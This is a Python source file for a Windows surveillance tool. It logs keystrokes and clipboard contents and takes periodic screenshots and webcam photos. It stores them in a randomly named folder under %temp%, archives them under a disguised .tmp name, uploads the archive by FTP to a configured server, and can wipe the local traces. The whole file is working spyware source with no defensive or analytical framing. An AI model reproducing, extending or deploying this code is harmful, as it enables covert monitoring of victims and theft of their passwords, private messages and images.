# -*- coding: utf-8 -*-

from pynput.keyboard import Key, Controller, Listener
from shutil import rmtree, make_archive
from datetime import datetime
from threading import Thread
from time import time, sleep
from pyperclip import paste
from random import randint
from ftplib import FTP
import pyautogui
import json
import cv2
import sys
import os

from keysTranslation import translate
from make_conf import get_sys_info
from rand_seq import get_new

start = time()

global user
user = os.environ['USERNAME']

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.getcwd()

    return os.path.join(base_path, relative_path)

with open(resource_path('answers.json'), 'r') as fobj:
    answers = json.load(fobj)

with open(resource_path('keys_to_check.json'), 'r') as fobj:
    keys_to_check = json.load(fobj)

ftp_address = answers["[server] FTP server (IPv4): "].strip()
ftp_login = answers["[server] FTP user login: "].strip()
ftp_password = answers["[server] FTP user password: "].strip()


def make_new_dir():
    # Creating a new directory in '%temp%'.
    global new_folder_name
    new_folder_name = get_new(length=36)

    global new_directory
    new_directory = f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{new_folder_name}"

    os.mkdir(new_directory)

    # Creating keylog directory.
    try:
        os.mkdir(f'{new_directory}\\Keyboard')
    except FileExistsError:
        pass
    finally:
        with open(f'{new_directory}\\Keyboard\\confirm.txt', 'tw', encoding='utf-8') as file_object:
            file_object.write(f'{new_directory}\\Keyboard')

    with open(f'{new_directory}\\home_dir.txt', 'tw', encoding='utf-8') as file_object:
        file_object.write(new_directory)
    
    print("Created home directory in '%temp%'.")

    # Saving a name of a new folder.
    with open(f'C:\\Users\\{user}\\AppData\\Local\\Temp\\existing.json', 'w') as file_object:
        json.dump(new_folder_name, file_object)

# Checking if 'home directory' exists.
try:
    with open(f'C:\\Users\\{user}\\AppData\\Local\\Temp\\existing.json', 'r') as file_object:
        
        existing_dir_name = json.load(file_object)

        try:
            with open(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{existing_dir_name}\\home_dir.txt", 'r') as file_object:
                pass

        except FileNotFoundError:
            print("[ ERROR ]: Wrong folder name specified in 'existing.json'" + 
                "(name is incorrect or deprecated).\nCreating a new directory...")

            make_new_dir()
            with open(f'C:\\Users\\{user}\\AppData\\Local\\Temp\\existing.json', 'r') as file_object:
                existing_dir_name = json.load(file_object)

except FileNotFoundError:

    make_new_dir()
    with open(f'C:\\Users\\{user}\\AppData\\Local\\Temp\\existing.json', 'r') as file_object:
        existing_dir_name = json.load(file_object)

else:
    print("File 'existing.json' is found (home directory already exists).")


def add_zero(value):
    """ Adds a zero before a number if it is less than ten. """
    if value < 10:
        final_value = f"0{value}"
    elif value >= 10:
        final_value = value

    return final_value

def get_screenshot_name(custom_filename='', prefix='Screenshot_', extension='.png', clipboard=False):
    """ Gets the current date and time to use 
    it as a name for a screenshot (or webcam photo). """
    if custom_filename:
        filename = custom_filename

    elif not custom_filename:
        full_date = datetime.now()

        current_month = full_date.month
        current_month = add_zero(current_month)

        current_day = full_date.day
        current_day = add_zero(current_day)

        current_hour = full_date.hour
        current_hour = add_zero(current_hour)

        current_minute = full_date.minute
        current_minute = add_zero(current_minute)

        current_second = full_date.second
        current_second = add_zero(current_second)

        if clipboard == False:
            result = f"{prefix}{current_month}_{current_day}_{full_date.year}_"
            result += f"{current_hour}_{current_minute}_{current_second}{extension}"

        elif clipboard == True:
            result = f"{current_month}/{current_day}/{full_date.year} "
            result += f"{current_hour}:{current_minute}:{current_second}"

    return result


def check_exit():
    if NewThread.shut_down == True:
        sys.exit()

# Keystroke capturing functions.

def save_to_file():
    """ description """
    while True:
        check_exit()
    
        if NewThread.write_now:

            NewThread.keys_history = [str(element) for element in NewThread.keys_history]

            try:
                with open(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{existing_dir_name}\\Keyboard\\keys_history.txt", 'ta', encoding='utf-8') as file_object:
                    file_object.write(' '.join(NewThread.keys_history) + ' ')

            except FileNotFoundError:
                with open(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{existing_dir_name}\\Keyboard\\keys_history.txt", 'tw', encoding='utf-8') as file_object:
                    file_object.write(' '.join(NewThread.keys_history) + ' ')

            finally:
                NewThread.keys_history = []
                NewThread.write_now = False

        # Clipboard handling.
        if (paste() != NewThread.current_clipboard) or (NewThread.first_time_saved == True):

            if (paste() != NewThread.current_clipboard) and (NewThread.first_time_saved == False):
                NewThread.current_clipboard = paste()
                NewThread.clipboard_history[get_screenshot_name(clipboard=True)] = NewThread.current_clipboard

            elif (NewThread.first_time_saved == True):
                NewThread.first_time_saved = False

            # Saving a file with a history.
            path = f"C:\\Users\\{user}\\AppData\\Local\\Temp\\"

            with open(f'C:\\Users\\{user}\\AppData\\Local\\Temp\\existing.json', 'r') as file_object:
                home_folder = json.load(file_object)

            # Creating a new directory for files with clipboard history.
            try:
                with open(f"{path}{home_folder}\\Clipboard\\confirm.txt", 'tr', encoding='utf-8') as file_object:
                    pass

            except FileNotFoundError:
                try:
                    os.mkdir(f"{path}{home_folder}\\Clipboard")

                except FileExistsError:
                    pass

                finally:
                    with open(f"{path}{home_folder}\\Clipboard\\confirm.txt", 'tw', encoding='utf-8') as file_object:
                        file_object.write(f"{path}{home_folder}\\Clipboard")

            # Checking if file with a history already exists.
            if NewThread.existing_clipboard_file:
                with open(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\" +
                    f"{home_folder}\\Clipboard\\{NewThread.existing_clipboard_file}", 'w', encoding='utf-8') as file_object:
                        json.dump(NewThread.clipboard_history, file_object, ensure_ascii=False, indent=4)

            elif not NewThread.existing_clipboard_file:
                clipboard_file = get_screenshot_name(prefix='Clipboard_', extension='.json')

                with open(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\" +
                    f"{home_folder}\\Clipboard\\{clipboard_file}", 'w', encoding='utf-8') as file_object:
                        json.dump(NewThread.clipboard_history, file_object, ensure_ascii=False, indent=4)

                NewThread.existing_clipboard_file = clipboard_file

        # We inform the main thread that it is time to transmit data.
        NewThread.transmit_data = True

def write_new_key(key):
    """ This function adds a new keystroke to the list if the number of items 
    in this list is less than the number specified by the user. If it is equal, 
    all the items from this list are written to a text file, and the list is cleared. """

    check_exit()

    if len(NewThread.keys_history) < keys_amount:

        if 'Key.' in str(key):
            key_copy = translate(key)
            if key_copy == None:
                print(f"{key}: The corresponding value was not found.")
                NewThread.keys_history.append(key_copy)

            else:
                key = key_copy
                NewThread.keys_history.append(key)

        else:
            NewThread.keys_history.append(key)

        # print(NewThread.keys_history)

    elif len(NewThread.keys_history) == keys_amount:
        NewThread.write_now = True

        while NewThread.keys_history != []:
            pass

        if 'Key.' in str(key):
            key_copy = translate(key)
            if key_copy == None:
                print(f"{key}: The corresponding value was not found.")
                NewThread.keys_history.append(key_copy)

            else:
                key = key_copy
                NewThread.keys_history.append(key)

        # print(NewThread.keys_history)


def start_keyboard_capturing(on_press, keys_to_send, on_release=''):
    global keys_amount
    keys_amount = keys_to_send

    with open('keys_history.txt', 'tw', encoding='utf-8') as file_object:
        pass

    with Listener(on_press=write_new_key) as listener:
        listener.join()


def take_screenshots(custom_filename='', sec_interval=20):
    """ Simply takes screenshots. """

    path = f"C:\\Users\\{user}\\AppData\\Local\\Temp\\"

    with open(f'{path}existing.json', 'r') as file_object:
        folder_to_save = json.load(file_object)

    try:
        with open(f"{path}{folder_to_save}\\Screenshots\\confirm.txt", 'tr', encoding='utf-8') as file_object:
            pass

    except FileNotFoundError:
        try:
            os.mkdir(f'{path}{folder_to_save}\\Screenshots')

        except FileExistsError:
            pass

        finally:
            with open(f"{path}{folder_to_save}\\Screenshots\\confirm.txt", 'tw', encoding='utf-8') as file_object:
                file_object.write(f"{path}{folder_to_save}\\Screenshots")


    # Trying to take a screenshot of a screen. If an attempt is successful,
    # we output a success message. If not, we output an error message.
    try:
        filename = get_screenshot_name()
        pyautogui.screenshot(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\" +
            f"{existing_dir_name}\\Screenshots\\{filename}")
    except:
        print("[ ERROR ]: Failed to start screenshot capturing.")
        sys.exit()
    else:
        print("[ OK ]: Screenshot capturing started.")


    # Entering the loop.
    while True:
        check_exit()

        sleep(sec_interval)

        filename = get_screenshot_name()

        try:
            pyautogui.screenshot(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\" +
                f"{existing_dir_name}\\Screenshots\\{filename}")
        except OSError:
            print(f"[ ERROR ]: Failed to take a screenshot. Next try in {sec_interval}s.")
        else:
            print(f"[DONE]: Screenshot captured.")

def enable_webcam(sec_interval=30):

    path = f"C:\\Users\\{user}\\AppData\\Local\\Temp\\"

    with open(f'{path}existing.json', 'r') as file_object:
        folder_to_save = json.load(file_object)

    # Creating a new directory for photos from webcam.
    try:
        with open(f"{path}{folder_to_save}\\Webcam\\confirm.txt", 'tr', encoding='utf-8') as file_object:
            pass

    except FileNotFoundError:
        try:
            os.mkdir(f"{path}{folder_to_save}\\Webcam")
        
        except FileExistsError:
            pass

        finally:
            with open(f"{path}{folder_to_save}\\Webcam\\confirm.txt", 'tw', encoding='utf-8') as file_object:
                file_object.write(f"{path}{folder_to_save}\\Webcam")

    webcam_error = 0
    while True:
        check_exit()

        cap = cv2.VideoCapture(0)

        for i in range(5):
            cap.read()

        ret, img = cap.read()

        filename = get_screenshot_name(prefix='Webcam_')

        try:
            cv2.imwrite(f"{path}{folder_to_save}\\Webcam\\{filename}", img)

        except cv2.error:
            webcam_error += 1

            if webcam_error > 3:
                print("Stopping webcam capturing...")
                sys.exit()
            else:
                print("[FAILED]: Unable to take a picture from the webcam.")              

        cap.release()

        sleep(sec_interval)

def transmit_data(server_address, ftp_login, ftp_password, archive_name, next_try=2):
    """ Transmit all collected data to the server. """
    while True:
        sleep(next_try)
        try:
            server = FTP(server_address)
        except TimeoutError:
            pass
        else:
            server.login(ftp_login, ftp_password)
            # Load an "archive".
            path_to_archive = f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{archive_name}.tmp"
            with open(path_to_archive, 'rb') as file_object:
                server.storbinary('STOR ' + f'{archive_name}.zip', file_object)
                print("Transferring data...")
                server.quit()
                break


class NewThread(Thread):
    """ Using multithreading to capture all keystrokes from keyboard. """

    transmit_data = False

    existing_clipboard_file = ''

    clipboard_history = {}
    current_clipboard = paste()
    first_clipboard_time = get_screenshot_name(clipboard=True)
    first_time_saved = False

    shut_down = False

    active_threads = []

    # This list records keyboard clicks up to a user-defined number, 
    # and then the 'write_new_key' function' clears this list.
    keys_history = []

    write_now = False

    def __init__(self, thread_name):
        """ Initializing a new thread. """
        Thread.__init__(self)

        self.thread_name = thread_name

        if self.thread_name in NewThread.active_threads:
            exists = NewThread.active_threads.count(self.thread_name)
            self.thread_queue = exists + 1
        else:
            self.thread_queue = 1

        NewThread.active_threads.append(self.thread_name)


    def run(self):
        print(f"Starting {self.thread_name}-{self.thread_queue}...")

        # In this dictionary, KEYS are expected thread names, and VALUES are lists 
        # that contain a function to call and an argument for that function.

        for key, value in answers.items():
            if '[1]' in key:
                keyboard_thread_arg = value

        call_function = {
            "KeyboardCapture": [start_keyboard_capturing, write_new_key, keyboard_thread_arg],
            "WriteKeysToFile": [save_to_file],
            # "MouseCapture": [],
            "ScreenshotCapture": [take_screenshots],
            "WebcamCapture": [enable_webcam],
        }

        found = False
        for key, func_arg in call_function.items():
            if self.thread_name == key:
                found = True

                if len(func_arg) == 3:
                    func_arg[0](func_arg[1], func_arg[2])
                elif len(func_arg) == 2:
                    func_arg[0](func_arg[1])
                else:
                    func_arg[0]()

        if not found:
            error_msg = f"[{self.thread_name}-{self.thread_queue}]: "
            error_msg += "Failed to start this thread (Incorrect thread name)."

            raise NameError(error_msg)

threads_list = []
threads_list.append(NewThread('WriteKeysToFile'))
threads_list.append(NewThread('KeyboardCapture'))
threads_list.append(NewThread('ScreenshotCapture'))
threads_list.append(NewThread('WebcamCapture'))

turn_on = [answers[keys_to_check[3]], answers[keys_to_check[4]]]

# Clibpoard.
NewThread.clipboard_history[NewThread.first_clipboard_time] = NewThread.current_clipboard
NewThread.first_time_saved = True
del NewThread.first_clipboard_time

# Starting the threads.
for thread in threads_list:
    if (thread.thread_name == 'WebcamCapture') and (turn_on[0].strip().lower() == 'n'):
        pass
    elif (thread.thread_name == 'ScreenshotCapture') and (turn_on[1].strip().lower() == 'n'):
        pass
    else:
        thread.start()

get_sys_info(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{existing_dir_name}")

if type(answers["[2] Shut down in (seconds): "]) == int:
    start = time()

    while True:
        if time()-start >= answers["[2] Shut down in (seconds): "]:
            NewThread.shut_down = True

            temp_file_name = get_new(randint(9, 55))
            make_archive('config', 'zip', f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{existing_dir_name}")
            os.rename("config.zip", f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{temp_file_name}.tmp")

            with open(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\existing.json", 'r', encoding='utf-8') as file_object:
                existing_folder = json.load(file_object)

            for thread in threads_list:
                if (thread.thread_name == 'WebcamCapture') and (turn_on[0].strip().lower() == 'n'):
                    pass
                elif (thread.thread_name == 'ScreenshotCapture') and (turn_on[1].strip().lower() == 'n'):
                    pass
                else:
                    thread.join()

            if answers[keys_to_check[2]].strip().lower() == 'n':
                # Deleting the home folder with the user's saved data.
                rmtree(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{existing_folder}")
                print("[DONE]: Removed home directory in '%temp%'.")
                os.remove(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\existing.json")
                print("[DONE]: Removed 'existing.json'.")
                
            try:
                transmit_data(ftp_address, ftp_login, ftp_password, archive_name=temp_file_name)
                
            except:
                print("Network Error. Exiting...")
                NewThread.shut_down = True
            finally:
                os.remove(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{temp_file_name}.tmp")
                break

elif type(answers["[2] Shut down in (seconds): "]) == str:
    while True:
        if NewThread.transmit_data == True:
            temp_file_name = get_new(randint(9, 55))
            make_archive('config', 'zip', f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{existing_dir_name}")
            os.rename("config.zip", f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{temp_file_name}.tmp")
               
            try:
                transmit_data(ftp_address, ftp_login, ftp_password, archive_name=temp_file_name)
                
            except:
                print("Network Error. Exiting...")
                NewThread.shut_down = True
            finally:
                NewThread.transmit_data = False
                os.remove(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{temp_file_name}.tmp")
